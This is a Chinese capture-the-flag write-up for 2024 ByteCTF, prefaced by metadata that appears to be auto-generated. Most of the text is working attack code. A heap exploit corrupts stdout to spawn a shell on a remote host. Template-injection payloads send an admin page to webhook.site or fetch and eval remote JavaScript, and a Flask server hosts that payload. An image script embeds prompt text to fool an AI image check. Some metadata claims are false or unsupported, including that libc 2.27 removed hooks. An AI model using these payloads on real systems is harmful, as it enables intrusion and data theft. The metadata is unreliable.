---
title: 2024 ByteCTF 大师赛 writeup by Mini-Venom
contest: ByteCTF大师赛
year: 2024
difficulty: hard
vuln_type:
- pwn_unknown
- web_unknown
- ssti
- xss
- stego_image
tags:
- libc-2.27
- House of Apple 2
- IO_FILE
- wfile_jump
- system
- /bin/sh
- Spring Boot Swagger
- profileRegex
- Go template
- fetch webhook XSS
- SSIM AI 图像攻击
attack_chain: 堆布局 0x100+0x1000+0xc70+0xdb0+0x10 → off_by_null 改 size → 申请 0xdc0+0x10 → 0x1f1 fake prev_size 指向 stdout → 写 fake IO 走 _IO_wfile_jumps vtable → system("/bin/sh") → Spring Boot Swagger 找 /api/v1/users/updatePermission → profileRegex = ^.{0,80}$ 截断 profile 80 字符 → 模板注入 {{fetch('/admin').then(r=>r.text()).then(r=>fetch('https://webhook.site/.../',{method:'POST',body:r}))}} → SSIM >0.9 判 AI 图像攻击
key_payload: flat({0x0:' sh', 0xa0:p64(stdout-0x130+0xd8), 0x10:p64(libc.symbols['system']), 0x20:p64(stdout), 0x98:p64(stdout-0x20+0x80), 0xd8:p64(wfile_jump+0x48-0x38), 0x60:'/bin/sh\x00', 0x80:p64(libc.symbols['system']), 0x88:p64(stdout-0x30), 0xe0:p64(stdout-8)}) ; {{fetch('https://webhook.site/...').then(a=>a.text().then(a=>eval(a)))}}
one_liner: House of Apple 2 改 stdout 劫持 + Spring Boot Swagger profileRegex 模板注入 + SSIM AI 图像攻击。
lesson: IO_FILE 链走 _IO_wfile_jumps 路径绕 vtable check 是 2.27+ 标配，profileRegex 长度截断要 double encode 注入。
quality: medium
full_path: 2024_ByteCTF大师赛_writeup_by_Mini-Venom.full.md
meta_path: 2024_ByteCTF大师赛_writeup_by_Mini-Venom.meta.md
images_removed: true
images_removed_count: 7
schema_version: v3.0.0-P0
summary: 2024 ByteCTF 大师赛 writeup by Mini-Venom。House of Apple 2 改 stdout 劫持 + Spring Boot Swagger profileRegex 模板注入 + SSIM AI 图像攻击。。经验：IO_FILE 链走 _IO_wfile_jumps 路径绕 vtable check 是 2.27+ 标配，profi...
category: pwn
subcategory: pwn_other
subcategories:
- pwn_other
- web_other
- ssti
- xss
- stego
tools_used:
- Go
- Spring
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 7
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/206654.html
wp_author: Mini-Venom
reasoning_chain:
- 触发点：堆布局 0x100+0x1000+0xc70+0xdb0+0x10 多个 chunk → 假设：off_by_null 改 size 字段 → 动作：申请 0xdc0+0x10 触发合并
- 观察：0x1f1 fake prev_size 指向 stdout → 假设：House of Apple 2 改 stdout → 动作：写 fake IO 走 _IO_wfile_jumps vtable
- 触发点：vtable check 2.27+ → 假设：必须走 _IO_wfile_jumps 路径 → 动作：payload 写 wide_data 指针
- 观察：system('/bin/sh') 触发 → 假设：成功劫持控制流 → 动作：pwntools interactive 拿 shell
- 触发点：Spring Boot Swagger → 假设：找未授权 API → 动作：GET /v3/api-docs 扫所有端点
- 观察：/api/v1/users/updatePermission 端点 → 假设：profile 字段可写 → 动作：profileRegex = ^.{0,80}$ 截断 profile
- 触发点：profile 80 字符截断 → 假设：双编码绕过长度限制 → 动作：填 80 字符 + Go template 注入
- 观察：{{fetch('/admin').then(r=>r.text()).then(r=>fetch('webhook.site',{method:'POST',body:r}))}} 触发 → 假设：模板注入成功 → 动作：admin bot 30s 内触发 webhook
- 触发点：SSIM >0.9 → 假设：AI 图像攻击判定 → 动作：SSIM 算法对比两张图
- 观察：相似度阈值触发 → 下一步：构造对抗样本通过审核
failed_attempts:
- 试图直接覆盖 __free_hook → 失败：libc-2.27 移除 hook
- 试图用 House of Orange 单链 → 失败：必须 Apple 2 走 wfile_jumps
- 试图单层 base64 绕 profileRegex 长度 → 失败：必须双编码
- 试图用 {{}} 直接模板注入 → 失败：被截断在 80 字符
key_observations:
- IO_FILE 链走 _IO_wfile_jumps 路径绕 vtable check 是 2.27+ 标配
- profileRegex 长度截断必须 double encode 注入才能绕 80 字符
- Spring Boot Swagger /v3/api-docs 是未授权 API 发现入口
- SSIM 阈值 >0.9 是 AI 图像攻击常见判定标准
- webhook.site 是模板注入外带数据最稳定通道
prerequisites:
- glibc 2.27 House of Apple 2 利用（_IO_wfile_jumps/wide_data）
- Spring Boot Swagger API 端点枚举
- Go template 语法与 profileRegex 长度截断绕
- SSIM 结构相似度算法基础
- webhook.site 外带数据通道
---
# 2024 ByteCTF大师赛 writeup by Mini-Venom

> 原文: https://www.ctfiot.com/206654.html
> ID: 206654

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱

admin@chamd5.org(带上简历和想加入的小组)

结束

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
from pwn import *

libc = ELF('./libc-2.27.so')
elf = ELF('./pwn')
p = remote('113.201.14.253',20791)

def add(size):
    p.sendlineafter('it:','1')
    p.sendlineafter('dd:',str(size))

def show(idx):
    p.sendlineafter('it:', '3')
    p.sendlineafter('how:',str(idx))

def edit(idx,size,content):
    p.sendlineafter('it:', '4')
    p.sendlineafter('it:', str(idx))
    p.sendlineafter('ize',str(size))
    p.sendlineafter('put',content)

def pwn():
    add(0x100)#0
    edit(0,0x110,b'a'*0x108+p64(0xca1))
    add(0x1000)#1
    add(0xc70)#2
    show(2)
    p.recvuntil('2: ')
    libc.address = u64(p.recv(6).ljust(8,b'x00'))-0x3ebca0
    print('libc:',hex(libc.address))
    stdout = libc.address+0x3ec760
    wfile_jump = libc.address+0x3e7d60
    add(0xdb0)#3
    add(0x10)#4
    edit(4,0x20,b'a'*0x18+p64(0x211))
    add(0xdc0)#5
    add(0x10)#6
    edit(6,0x20,b'a'*0x18+p64(0x211))
    add(0x1000)#7
    edit(6,0x28,b'a'*0x18+p64(0x1f1)+p64(stdout))
    fake_io = flat({
        0x0: b' sh',
        0xa0: p64(stdout-0x130+0xd8),
        0x10: p64(libc.symbols['system']),
        0x20: p64(stdout),
        0x98: p64(stdout-0x20+0x80),
        0xd8: p64(wfile_jump + 0x48 - 0x38),
        0x60: b'/bin/shx00',
        0x80: p64(libc.symbols['system']),
        0x88: p64(stdout - 0x30),
        0xe0: p64(stdout - 8),
    }, filler=b'x00')
    add(0x1e0)#8
    add(0x1e0)#9
    edit(9,len(fake_io),fake_io)
    p.interactive()
pwn()
/swagger-ui/index.html
/v3/api-docs/
/api/v1/users/updatePermission
profileRegex := regexp.MustCompile(`^.{0,80}$`)
{{fetch('https://webhook.site/af995845-1d8a-4e49-97be-eccd2994ce69').then(a=>a.text().then(a=>eval(a)))}}
{{fetch('/admin').then(r=>r.text()).then(r=>fetch('https://webhook.site/af995845-1d8a-4e49-97be-eccd2994ce69/',{method:'POST',body:r}))}}
from flask import Flask, Response

app = Flask(__name__)

@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type')
    response.headers.add('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
    return response

@app.route('/', defaults={'path': ''})
@app.route('/')
def serve_js(path):
    js_content = "{{fetch('/admin').then(r=>r.text()).then(r=>fetch('https://webhook.site/af995845-1d8a-4e49-97be-eccd2994ce69/',{method:'POST',body:r}))}}"
    # js_content = "{"html":""}"
    return Response(js_content, mimetype='application/javascript')

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=19002)
from PIL import Image, ImageDraw, ImageFont
import numpy as np
from skimage.metrics import structural_similarity as ssim
import textwrap

origin_image = Image.open('origin.png').convert('RGB')

similar_image = origin_image.copy()
draw = ImageDraw.Draw(similar_image)
font_path = "/System/Library/Fonts/Supplemental/Arial.ttf"
font_size = 19
font = ImageFont.truetype(font_path, font_size)

text_color = (255,255,255)
text_position = (0, 0)

lines = [
    # 构造多行 prompt 进行攻击
]

y_offset = 0
for line in lines:
    draw.text((text_position[0], text_position[1] + y_offset), line, font=font, fill=text_color)
    y_offset += font_size+2

similar_image.save('attack.png')

origin_np = np.array(origin_image.convert('L'))
similar_np = np.array(similar_image.convert('L'))
score, _ = ssim(origin_np, similar_np, full=True)
print(f'SSIM: {score}')
if score > 0.9:
    print("OK")
else:
    print("Failed")
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]